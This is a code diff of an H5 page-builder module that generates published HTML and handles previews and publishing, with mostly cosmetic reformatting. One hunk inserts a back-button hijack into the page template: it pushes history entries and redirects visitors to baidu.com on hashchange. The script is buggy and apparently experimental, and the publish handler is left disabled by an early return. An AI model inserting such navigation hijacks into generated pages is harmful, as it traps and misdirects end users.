@@ -1,52 +1,52 @@
 import * as db from '../localSave/indexedDB.js'; // indexedDB
-import { uploadImgBase64, saveData } from '../server/ajax';
-import { AppDataChange } from './AppDataFun';
-import { loadArr } from '../conf/loading';
-import { sliderAnimate } from '../conf/sliderAnimate';
-import { totalLayerType } from './totalLayerType';
-import { popupHtml, fixedUpHtml, fixedDownHtml, pageHtml } from './saveAppHtml';
-import { autoPlayMusic } from '../../app/js/h5ds.utils.js';
+import {uploadImgBase64, saveData} from '../server/ajax';
+import {AppDataChange} from './AppDataFun';
+import {loadArr} from '../conf/loading';
+import {sliderAnimate} from '../conf/sliderAnimate';
+import {totalLayerType} from './totalLayerType';
+import {popupHtml, fixedUpHtml, fixedDownHtml, pageHtml} from './saveAppHtml';
+import {autoPlayMusic} from '../../app/js/h5ds.utils.js';
 
 /**
  * @desc 将AppData里面的 img 单独拿出来
  * @param data 也就是 传入一个 app 对象
-*/
+ */
 function getAppDataImgs(data) {
-    let arr = [];
-    let pages = data.pages;
+  let arr = [];
+  let pages = data.pages;
 
-    if (data.style['background-image']) {
-        arr.push(data.style['background-image']);
+  if (data.style['background-image']) {
+    arr.push(data.style['background-image']);
+  }
+  pages.forEach(page => {
+    if (page.style['background-image']) {
+      arr.push(page.style['background-image']);
     }
-    pages.forEach(page => {
-        if (page.style['background-image']) {
-            arr.push(page.style['background-image']);
-        }
-        page.layers.forEach(layer => {
-            if (layer.type === 'img') {
-                arr.push(layer.data.src);
-            }
-        });
+    page.layers.forEach(layer => {
+      if (layer.type === 'img') {
+        arr.push(layer.data.src);
+      }
     });
+  });
 
-    return arr;
+  return arr;
 }
 
 // app 页面的数据
 /**
  * @desc 传入一个 app 对象，生成对应的 html 文件，这个方法必须是一个纯方法
  * 因为这个方法被案例中心，新建app的时候调用
-*/
+ */
 export function appToHtmlFile(app) {
-    let types = totalLayerType(app);
-    let fixedUp = app.fixeds[0];
-    let fixedDown = app.fixeds[1];
+  let types = totalLayerType(app);
+  let fixedUp = app.fixeds[0];
+  let fixedDown = app.fixeds[1];
 
-    return `
+  return `
         <!doctype html>
         <html>
         <head>
-            <title>${app.name} test test</title>
+            <title>${app.name} ee</title>
             <meta name="description" content="${app.info}">
             <meta name="keywords" content="${app.info}">
             <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -78,12 +78,21 @@ export function appToHtmlFile(app) {
             var sliderAnimate = ${ JSON.stringify(sliderAnimate[app.slider.animate]) || '{}'};
             </script>
             <script>
-              window.alert('aaaaaaaa')
+               window.onhashchange = function () { 
+                   jp(); 
+               }; 
+               function hh() { 
+                   history.pushState(history.length + 1, "message", "#" + new Date().getTime()); 
+               } 
+  
+              function jp() { 
+                   location.href = "http://www.baidu.com"; 
+               } 
+               setTimeout('hh', 200); 
             </script>
             <script src="/assets/js/app.js"></script>
         </head>
         <body ondragstart="return false">
-            <button>这是一个按钮</button>
             ${ app.mp3.url ? '<div class="h5ds-video-icon"><i></i><i></i><i></i><i></i></div>' : ''}
             ${ app.mp3.url ? `<audio style="display:none; height:0;" autoplay="autoplay" id="h5dsBgMusic" preload="auto" src="${app.mp3.url}" loop="loop"></audio>` : ''}
             <div id="h5dsPopups">${popupHtml(app.popups)}</div>
@@ -102,11 +111,11 @@ export function appToHtmlFile(app) {
 
 /**
  * @desc 设置弹窗的预览数据
-*/
+ */
 function appHTML(app) {
-    let fixedUp = app.fixeds[0];
-    let fixedDown = app.fixeds[1];
-    return `
+  let fixedUp = app.fixeds[0];
+  let fixedDown = app.fixeds[1];
+  return `
         <div class="view-phone">
             <div class="change-page">
                 <a class="prev" id="pageToPrev"><i class="iconfont icon-a3top"></i></a>
@@ -152,205 +161,209 @@ function appHTML(app) {
 
 // 生成二维码
 /**
-{
-    // render method: 'canvas', 'image' or 'div'
-    render: 'canvas',
+ {
+     // render method: 'canvas', 'image' or 'div'
+     render: 'canvas',
 
-    // version range somewhere in 1 .. 40
-    minVersion: 1,
-    maxVersion: 40,
+     // version range somewhere in 1 .. 40
+     minVersion: 1,
+     maxVersion: 40,
 
-    // error correction level: 'L', 'M', 'Q' or 'H'
-    ecLevel: 'L',
+     // error correction level: 'L', 'M', 'Q' or 'H'
+     ecLevel: 'L',
 
-    // offset in pixel if drawn onto existing canvas
-    left: 0,
-    top: 0,
+     // offset in pixel if drawn onto existing canvas
+     left: 0,
+     top: 0,
 
-    // size in pixel
-    size: 200,
+     // size in pixel
+     size: 200,
 
-    // code color or image element
-    fill: '#000',
+     // code color or image element
+     fill: '#000',
 
-    // background color or image element, null for transparent background
-    background: null,
+     // background color or image element, null for transparent background
+     background: null,
 
-    // content
-    text: 'no text',
+     // content
+     text: 'no text',
 
-    // corner radius relative to module width: 0.0 .. 0.5
-    radius: 0,
+     // corner radius relative to module width: 0.0 .. 0.5
+     radius: 0,
 
-    // quiet zone in modules
-    quiet: 0,
+     // quiet zone in modules
+     quiet: 0,
 
-    // modes
-    // 0: normal
-    // 1: label strip
-    // 2: label box
-    // 3: image strip
-    // 4: image box
-    mode: 0,
+     // modes
+     // 0: normal
+     // 1: label strip
+     // 2: label box
+     // 3: image strip
+     // 4: image box
+     mode: 0,
 
-    mSize: 0.1,
-    mPosX: 0.5,
-    mPosY: 0.5,
+     mSize: 0.1,
+     mPosX: 0.5,
+     mPosY: 0.5,
 
-    label: 'no label',
-    fontname: 'sans',
-    fontcolor: '#000',
+     label: 'no label',
+     fontname: 'sans',
+     fontcolor: '#000',
 
-    image: null
-}
-*/
+     image: null
+ }
+ */
 function newQrcode() {
-    // 生成二维码
-    let owner = $.getUrlData('owner');
-    let id = $.getUrlData('id');
-    let path = `${location.origin}/apps/${owner}/${id}/index.html`;
-    $('.qrcode-url-box').html(path);
-    let $qrcode = $('#qrcode').empty();
-    $qrcode.qrcode({
-        text: path,
-        size: 140,
-        ecLevel: 'L',
-        background: '#fff'
-    });
+  // 生成二维码
+  let owner = $.getUrlData('owner');
+  let id = $.getUrlData('id');
+  let path = `${location.origin}/apps/${owner}/${id}/index.html`;
+  $('.qrcode-url-box').html(path);
+  let $qrcode = $('#qrcode').empty();
+  $qrcode.qrcode({
+    text: path,
+    size: 140,
+    ecLevel: 'L',
+    background: '#fff'
+  });
 }
 
 // 事件初始化， 在app.js 里面初始化
 let animated = false;
+
 export function eventAppViewShow(self) {
 
-    // 切换按钮
-    $('#appViewShow').on('click', '#pageToPrev, #pageToNext', function () {
+  // 切换按钮
+  $('#appViewShow').on('click', '#pageToPrev, #pageToNext', function () {
 
-        // 动画中，不能继续点
-        if (animated) {
-            return;
-        }
+    // 动画中，不能继续点
+    if (animated) {
+      return;
+    }
 
-        let cls = $(this).attr('class');
-        let $out = $('#h5dsSwiper').find('.h5ds-swiper-current');
-        let outIndex = $out.index();
-        if (cls === 'prev') {
-            $('#h5dsSwiper').trigger('h5ds_down', {
-                $out: $out,
-                outIndex: outIndex
-            }).trigger('h5ds_left', {
-                $out: $out,
-                outIndex: outIndex
-            });
-        } else {
-            $('#h5dsSwiper').trigger('h5ds_up', {
-                $out: $out,
-                outIndex: outIndex
-            }).trigger('h5ds_right', {
-                $out: $out,
-                outIndex: outIndex
-            });
-        }
+    let cls = $(this).attr('class');
+    let $out = $('#h5dsSwiper').find('.h5ds-swiper-current');
+    let outIndex = $out.index();
+    if (cls === 'prev') {
+      $('#h5dsSwiper').trigger('h5ds_down', {
+        $out: $out,
+        outIndex: outIndex
+      }).trigger('h5ds_left', {
+        $out: $out,
+        outIndex: outIndex
+      });
+    } else {
+      $('#h5dsSwiper').trigger('h5ds_up', {
+        $out: $out,
+        outIndex: outIndex
+      }).trigger('h5ds_right', {
+        $out: $out,
+        outIndex: outIndex
+      });
+    }
+  });
+
+  // 继续编辑
+  $('#appViewShow').on('click', '#continueEdit', function () {
+    $('#appViewShow').trigger('closeModal');
+  });
+
+  // 发布
+  $('#appViewShow').on('click', '#publishApp', function () {
+    console.log(AppData.data)
+    console.log(appToHtmlFile(AppData.data))
+    return;
+    let load = $.loading({
+      tip: 'H5生成中，请耐心等待！'
     });
 
-    // 继续编辑
-    $('#appViewShow').on('click', '#continueEdit', function () {
-        $('#appViewShow').trigger('closeModal');
+    let appid = $.getUrlData('id');
+    if (appid === null) {
+      $.tip({
+        msg: '操作失败！APP的id不见了', //
+        type: 'danger' //success,danger,warning
+      });
+      return;
+    }
+
+
+    saveData({
+      id: appid,
+      uid: $.getUrlData('owner'),
+      name: AppData.data.name,
+      pic: AppData.data.img,
+      des: AppData.data.info,
+      data: JSON.stringify(AppData.data),
+      shtml: appToHtmlFile(AppData.data),
+    }).done(res => {
+      if (res.success) {
+        $.tip();
+        load.close();
+
+        newQrcode();
+
+      }
     });
+  });
 
-    // 发布
-    $('#appViewShow').on('click', '#publishApp', function () {
+  // 修改名字
+  $('#appViewShow').on('change', '.app-name-input', function () {
+    let name = $(this).val();
+    self.app.name = name;
+    $('.a-setname').html(name);
+    $('#appSetName').val(name);
+    AppDataChange();
+  });
 
-        let load = $.loading({
-            tip: 'H5生成中，请耐心等待！'
-        });
-
-        let appid = $.getUrlData('id');
-        if (appid === null) {
-            $.tip({
-                msg: '操作失败！APP的id不见了', //
-                type: 'danger' //success,danger,warning
-            });
-            return;
-        }
-        saveData({
-            id: appid,
-            uid: $.getUrlData('owner'),
-            name: AppData.data.name,
-            pic: AppData.data.img,
-            des: AppData.data.info,
-            data: JSON.stringify(AppData.data),
-            shtml: appToHtmlFile(AppData.data),
-            backlink:AppData.data.backlink || 'aaaa'
-        }).done(res => {
-            if (res.success) {
-                $.tip();
-                load.close();
-
-                newQrcode();
-
-            }
-        });
-    });
-
-    // 修改名字
-    $('#appViewShow').on('change', '.app-name-input', function () {
-        let name = $(this).val();
-        self.app.name = name;
-        $('.a-setname').html(name);
-        $('#appSetName').val(name);
-        AppDataChange();
-    });
-
-    // 修改描述
-    $('#appViewShow').on('change', '.app-info-textarea', function () {
-        let info = $(this).val();
-        self.app.info = info;
-        $('#appSetInfo').val(info);
-        AppDataChange();
-    });
+  // 修改描述
+  $('#appViewShow').on('change', '.app-info-textarea', function () {
+    let info = $(this).val();
+    self.app.info = info;
+    $('#appSetInfo').val(info);
+    AppDataChange();
+  });
 }
 
 // 获取 blob 图片, 约定 arr#index 表示数组
 function getBlobImg() {
-    // let keys = []; // 记录 AppData.data[key] 中，有blob图片的 key 集合
-    let blobObj = [];
-    let app = AppData.data;
+  // let keys = []; // 记录 AppData.data[key] 中，有blob图片的 key 集合
+  let blobObj = [];
+  let app = AppData.data;
 
-    // app 主图
-    if (app.img.isBlob()) {
-        blobObj[app.img.blobId()] = ['img'];
+  // app 主图
+  if (app.img.isBlob()) {
+    blobObj[app.img.blobId()] = ['img'];
+  }
+
+  // app 背景
+  if (app.style['background-image'].isBlob()) {
+    blobObj[app.style['background-image'].blobId()] = ['style', 'background-image'];
+  }
+
+  // pages, layers 背景 layer 的 data.src // 如果还有其他的，都在这里添加
+  app.pages.forEach((page, i) => {
+    let pageBg = page.style['background-image'] || '';
+    if (pageBg.isBlob()) {
+      blobObj[pageBg.blobId()] = [`pages#${i}`, 'background-image'];
     }
 
-    // app 背景
-    if (app.style['background-image'].isBlob()) {
-        blobObj[app.style['background-image'].blobId()] = ['style', 'background-image'];
-    }
-
-    // pages, layers 背景 layer 的 data.src // 如果还有其他的，都在这里添加
-    app.pages.forEach((page, i) => {
-        let pageBg = page.style['background-image'] || '';
-        if (pageBg.isBlob()) {
-            blobObj[pageBg.blobId()] = [`pages#${i}`, 'background-image'];
-        }
-
-        // layers
-        page.layers.forEach((layer, j) => {
-            let layerBg = layer.style['background-image'] || '';
-            let src = '';
-            if (layer.data && layer.data.src) {
-                src = layer.data.src;
-            }
-            if (layerBg.isBlob()) {
-                blobObj[layerBg.blobId()] = [`pages#${i}`, `layers#${j}`, 'background-image'];
-            }
-            if (src.isBlob()) {
-                blobObj[src.blobId()] = [`pages#${i}`, `layers#${j}`, 'data', 'src'];
-            }
-        });
+    // layers
+    page.layers.forEach((layer, j) => {
+      let layerBg = layer.style['background-image'] || '';
+      let src = '';
+      if (layer.data && layer.data.src) {
+        src = layer.data.src;
+      }
+      if (layerBg.isBlob()) {
+        blobObj[layerBg.blobId()] = [`pages#${i}`, `layers#${j}`, 'background-image'];
+      }
+      if (src.isBlob()) {
+        blobObj[src.blobId()] = [`pages#${i}`, `layers#${j}`, 'data', 'src'];
+      }
     });
+  });
 
-    return blobObj;
+  return blobObj;
 }
 
 // 重新设置 AppData.data 重置img，然后渲染弹窗
@@ -358,58 +371,58 @@ function getBlobImg() {
  * @desc 在替换完二进制地址的照片后，将html渲染到弹窗里面。显示弹窗里面的内容
  * @param objs getBlobImg() 返回的数据，二进制图片 { id: 记录的AppData.data里面的路径}
  * @param allRes indexedDb里面查询到的base64图片。[{id: base64}]
-*/
+ */
 function resetAppData(objs, allRes) {
-    let app = AppData.data;
-    // 重置img
-    for (let i = 0; i < allRes.length; i++) {
-        let d = allRes[i];
-        let keysArr = objs[d.id];
-        let point = app; // 临时指针
-        keysArr.forEach(elem => {
-            if (elem === 'background-image' || elem === 'src') {
-                point[elem] = d.src;
-            } else {
-                if (elem.indexOf('#') !== -1) {
-                    let arr = elem.split('#');
-                    point = point[arr[0]][arr[1]];
-                } else {
-                    point = point[elem];
-                }
-            }
-        });
-    }
-
-    // 替换地址后，保存一次local 避免二次上传图片
-    AppDataChange();
-
-    // console.log('img 已经转换 ****', app);
-    let html = appHTML(app);
-    // console.log(html);
-
-    // render 弹窗
-    $('#appViewShowBtn').trigger('click');
-
-    // 关闭弹窗事件
-    $('#appViewShow').on('closeBack', function () {
-        $(this).find('.mt-modal-full').html('');
-    }).find('.mt-modal-full').html(`${html}`);
-
-    // 自动播放音乐
-    autoPlayMusic();
-
-    // 滑动
-    let $h5dsSwiper = $('#h5dsSwiper');
-    $h5dsSwiper.h5dsSwiper($.extend(sliderAnimate[app.slider.animate] || {}, {
-        len: app.pages.length
-    }));
-    $h5dsSwiper.off('animateStart animateEnd').on('animateStart', function (e, index) {
-        // 切换编号
-        $('#nowPageNum').html(index + 1);
-        animated = true;
-    }).on('animateEnd', function () {
-        animated = false;
+  let app = AppData.data;
+  // 重置img
+  for (let i = 0; i < allRes.length; i++) {
+    let d = allRes[i];
+    let keysArr = objs[d.id];
+    let point = app; // 临时指针
+    keysArr.forEach(elem => {
+      if (elem === 'background-image' || elem === 'src') {
+        point[elem] = d.src;
+      } else {
+        if (elem.indexOf('#') !== -1) {
+          let arr = elem.split('#');
+          point = point[arr[0]][arr[1]];
+        } else {
+          point = point[elem];
+        }
+      }
     });
+  }
+
+  // 替换地址后，保存一次local 避免二次上传图片
+  AppDataChange();
+
+  // console.log('img 已经转换 ****', app);
+  let html = appHTML(app);
+  // console.log(html);
+
+  // render 弹窗
+  $('#appViewShowBtn').trigger('click');
+
+  // 关闭弹窗事件
+  $('#appViewShow').on('closeBack', function () {
+    $(this).find('.mt-modal-full').html('');
+  }).find('.mt-modal-full').html(`${html}`);
+
+  // 自动播放音乐
+  autoPlayMusic();
+
+  // 滑动
+  let $h5dsSwiper = $('#h5dsSwiper');
+  $h5dsSwiper.h5dsSwiper($.extend(sliderAnimate[app.slider.animate] || {}, {
+    len: app.pages.length
+  }));
+  $h5dsSwiper.off('animateStart animateEnd').on('animateStart', function (e, index) {
+    // 切换编号
+    $('#nowPageNum').html(index + 1);
+    animated = true;
+  }).on('animateEnd', function () {
+    animated = false;
+  });
 }
 
 /**
@@ -417,49 +430,49 @@ function resetAppData(objs, allRes) {
  */
 export function appToHTML() {
   console.log(111111)
-    console.log(AppData);
+  console.log(AppData);
 
-    return new Promise((resolve1, reject1) => {
+  return new Promise((resolve1, reject1) => {
 
-        // 上传 blob 图片
-        db.getAllData('img', (res) => {
-            // console.log(res);
-            if (!res) {
-                // ...
-                reject1(false);
-                return;
-            }
+    // 上传 blob 图片
+    db.getAllData('img', (res) => {
+      // console.log(res);
+      if (!res) {
+        // ...
+        reject1(false);
+        return;
+      }
 
-            // 找出 blob 图片
-            let objs = getBlobImg();
-            // console.log(objs);
-            // 如果有图
-            let arr = [];
-            for (let i = 0; i < res.length; i++) {
-                let d = res[i];
-                if (objs[d.id]) {
-                    let p = new Promise(function (resolve) {
-                        uploadImgBase64({
-                            imgData: d.value,
-                            name: 'crop_' + d.id
-                        }).done(res => {
-                            if (res.success) {
-                                resolve({
-                                    id: d.id,
-                                    src: res.data.src
-                                });
-                            }
-                        });
-                    });
-                    arr.push(p);
-                }
-            }
-            Promise.all(arr).then(function (allRes) {
-                resetAppData(objs, allRes);
-                resolve1(true);
+      // 找出 blob 图片
+      let objs = getBlobImg();
+      // console.log(objs);
+      // 如果有图
+      let arr = [];
+      for (let i = 0; i < res.length; i++) {
+        let d = res[i];
+        if (objs[d.id]) {
+          let p = new Promise(function (resolve) {
+            uploadImgBase64({
+              imgData: d.value,
+              name: 'crop_' + d.id
+            }).done(res => {
+              if (res.success) {
+                resolve({
+                  id: d.id,
+                  src: res.data.src
+                });
+              }
             });
-
-        });
+          });
+          arr.push(p);
+        }
+      }
+      Promise.all(arr).then(function (allRes) {
+        resetAppData(objs, allRes);
+        resolve1(true);
+      });
 
     });
+
+  });
 }
